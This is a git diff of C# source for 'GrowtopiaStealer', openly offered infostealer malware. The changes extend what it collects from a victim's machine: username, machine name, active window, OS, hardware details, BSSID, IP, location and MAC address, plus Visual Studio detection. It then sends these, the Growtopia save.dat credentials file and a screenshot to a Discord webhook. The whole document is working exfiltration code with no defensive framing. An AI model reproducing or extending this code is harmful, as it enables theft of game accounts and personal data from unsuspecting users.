@@ -50,6 +50,7 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             #region exists or not
             Growtopia.GrowtopiaExistOrNo();
             Discord.DiscordExistsOrNo();
+            Visual_Studio.VisualStudioExistOrNo();
             #endregion
 
             #region Rainbow Line gif
@@ -99,8 +100,6 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                 );
             #endregion
 
-            //client.SendToDiscord(rainbow);
-
             #region Embed webhook message with "JNogueira.Discord.Webhook.Client".
             // Messages
             var message = new DiscordMessage(
@@ -112,24 +111,35 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                     new DiscordMessageEmbed(
                         "GrowtopiaStealer",
                         color: 65280,
-                        author: new DiscordMessageEmbedAuthor(DateTime.Now.ToString("h:mm:ss") + " " + Environment.MachineName + " " + Environment.UserName),
+                        author: new DiscordMessageEmbedAuthor("Time: " + DateTime.Now.ToString("h:mm:ss")),
                         description:
+                               "\n ================================" +
+                               "\n```UserName: " + User + "```" +
+                               "\n```Machine Name: " + Environment.MachineName + "```" +
+                               "\n```Active Window: " + SystemInfo.GetActiveWindowTitle() + "```" +
+                               "\n ================================" +
+                               "\n```OC: " + SystemInfo.GetSystemVersion() + "```" +
+                               "\n```Screen Metrics: " + SystemInfo.ScreenMetrics() + "```" +
+                               "\n```CPU: " + SystemInfo.GetCPUName() + "```" +
+                               "\n```CPU: " + SystemInfo.GetGpuName() + "```" +
+                               "\n```CPU: " + SystemInfo.GetRAM() + "```" +
+                               "\n```BSSID: " + BSSID.GetBSSID() + "```" +
                                "\n ================================" +
                                "\n```IP: " + IP + "```" +
                                "\n```IPv6: " + IPv6 + "```" +
-                               "\n ================================" +
                                "\n```Country: " + Country + "```" +
                                "\n```City: " + City + "```" +
                                "\n```MAC Address: " + getTarget + "```" +
                                "\n ================================" +
                                "\n Grabbed Softwares:" +
                                (Counting.Growtopia > 0 ? "\n```Growtopia```" : "") +
+                               (Counting.VisualStudio > 0 ? "\n```Visual Studio```" : "") +
                                (Counting.Discord > 0 ? "\n```Discord```" : "")
                                ,
                         thumbnail: new DiscordMessageEmbedThumbnail("https://i.imgur.com/2Via1dY.jpg"),
                         image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877001811888865290/newlog.jpg"),
                         footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
-                               )});
+                               )});;
             #endregion
 
             #region ClipBoard
@@ -190,8 +200,15 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             try
             {
                 DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending Save.dat
-                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot
                 client.SendToDiscord(rainbow);
+            }
+            catch
+            {
+                DiscordWebhook.Send("Growtopia save.dat doesn't exists.");
+            }
+            try
+            {
+                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot
             }
             catch
             {
